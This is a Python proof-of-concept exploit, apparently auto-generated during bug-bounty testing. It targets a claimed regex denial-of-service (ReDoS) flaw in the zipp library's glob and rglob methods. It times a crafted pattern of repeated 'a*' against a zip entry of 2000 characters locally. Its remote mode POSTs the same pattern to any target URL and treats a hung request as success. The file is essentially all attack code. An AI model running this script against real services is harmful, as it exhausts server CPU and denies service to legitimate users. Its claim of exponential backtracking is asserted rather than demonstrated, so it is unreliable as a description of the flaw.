#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: suspicious-009
# Sink: match_dirs
# Auto-generated — run with: python3 redos_cpu_exhaustion_redos_match_dirs.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept ReDoS exploit for zipp library
Target: rglob method in zipp.Path (CVE-like vulnerability due to uncontrolled regex generation)
"""

import argparse
import os
import sys
import time
import tempfile
import zipfile

try:
    import requests
except ImportError:
    print("[!] 'requests' module not found. Please install it: pip install requests")
    sys.exit(1)

# Try to import zipp (local testing only)
try:
    import zipp
except ImportError:
    zipp = None
    print("[*] zipp not installed; remote testing only") if not sys.argv[1:] else None

# ----------------------------------------------------------------------
# Default configuration (override via command-line)
DEFAULT_TARGET = "http://localhost:8080/api/v1/trigger"
LOCAL_ZIP_ENTRY_LEN = 2000          # length of entry name to trigger backtracking
SAFE_TIMEOUT = 2                    # seconds after which we consider the request hung
# ----------------------------------------------------------------------

def make_malicious_pattern():
    """
    Generate a glob pattern that, when translated to regex, causes catastrophic
    backtracking on a long string of repeated characters.
    
    Pattern:  a*a*a*a*a
    Glob star becomes [^/]* (greedy).  On a string of 'a's, the regex engine
    struggles to find the optimal split among the stars, leading to exponential
    time.
    """
    # The more stars, the worse the backtracking.
    # 5 stars is enough for demonstrable slowdown on a 2000-char string.
    return "a" + "*a" * 5   # a*a*a*a*a*a

def make_benign_pattern():
    """Return a simple pattern that matches any entry."""
    return "*"

def remote_exploit(target_url, pattern, timeout=SAFE_TIMEOUT):
    """
    Send the malicious pattern to the vulnerable endpoint.
    Expect the server to hang or timeout.
    """
    payload = {"pattern": pattern}
    print(f"[*] Sending POST to {target_url}")
    print(f"[*] Pattern: {pattern!r}")
    start = time.time()
    try:
        r = requests.post(target_url, json=payload, timeout=timeout)
        elapsed = time.time() - start
        if r.status_code == 200:
            print(f"[*] Request completed in {elapsed:.2f}s (unexpectedly fast)")
        else:
            print(f"[*] Server returned {r.status_code} in {elapsed:.2f}s")
    except requests.exceptions.ReadTimeout:
        elapsed = time.time() - start
        print(f"[!] Request timed out after {elapsed:.2f}s – likely ReDoS triggered!")
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        sys.exit(1)

def local_exploit():
    """
    Create a temporary zip file with one very long entry name,
    then measure the time zipp.Path.rglob takes with a malicious vs benign pattern.
    """
    if zipp is None:
        print("[!] zipp package required for local testing.")
        print("    Install it from PyPI: pip install zipp")
        sys.exit(1)

    # Create a zip archive with a single entry named with many 'a's
    entry_name = "a" * LOCAL_ZIP_ENTRY_LEN
    tmp_zip = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
    tmp_zip.close()
    try:
        with zipfile.ZipFile(tmp_zip.name, 'w') as zf:
            zf.writestr(entry_name, "content")
        print(f"[*] Created temporary zip: {tmp_zip.name}")
        print(f"[*] Entry name length: {len(entry_name)} characters")

        # Open as zipp.Path
        zpath = zipp.Path(tmp_zip.name)
        print("[*] zipp.Path object created.")

        # Test benign pattern
        benign_pat = make_benign_pattern()
        print(f"[*] Testing benign pattern {benign_pat!r} ...")
        start = time.time()
        list(zpath.glob(benign_pat))  # consume generator
        benign_time = time.time() - start
        print(f"[+] Benign pattern took {benign_time:.3f}s")

        # Test malicious pattern
        mal_pat = make_malicious_pattern()
        print(f"[*] Testing malicious pattern {mal_pat!r} ...")
        start = time.time()
        # rglob prepends '**/' so the full pattern becomes '**/...'
        # That further increases backtracking.
        list(zpath.rglob(mal_pat))
        mal_time = time.time() - start
        print(f"[!] Malicious pattern took {mal_time:.3f}s")

        ratio = mal_time / (benign_time + 0.001)
        print(f"[*] Slowdown factor: {ratio:.1f}x")
        if ratio > 10:
            print("[+] ReDoS vulnerability confirmed locally!")
        else:
            print("[*] Slowdown modest; try increasing LOCAL_ZIP_ENTRY_LEN or adding more stars.")

    finally:
        os.unlink(tmp_zip.name)
        print("[*] Temporary zip cleaned up.")

def main():
    parser = argparse.ArgumentParser(
        description="ReDoS exploit for zipp library (rglob / glob). "
                    "Demonstrates catastrophic backtracking via user-controlled pattern."
    )
    parser.add_argument("-t", "--target",
                        help=f"Target URL (default: {DEFAULT_TARGET}). If not provided, local demo is run.")
    parser.add_argument("--timeout", type=int, default=SAFE_TIMEOUT,
                        help=f"Timeout in seconds for remote test (default {SAFE_TIMEOUT})")
    parser.add_argument("--local-only", action="store_true",
                        help="Force local demo even if target is given")
    args = parser.parse_args()

    if args.target and not args.local_only:
        # Remote exploit
        pattern = make_malicious_pattern()
        remote_exploit(args.target, pattern, timeout=args.timeout)
    else:
        # Local demo using zipp on a crafted zip
        local_exploit()

if __name__ == "__main__":
    main()
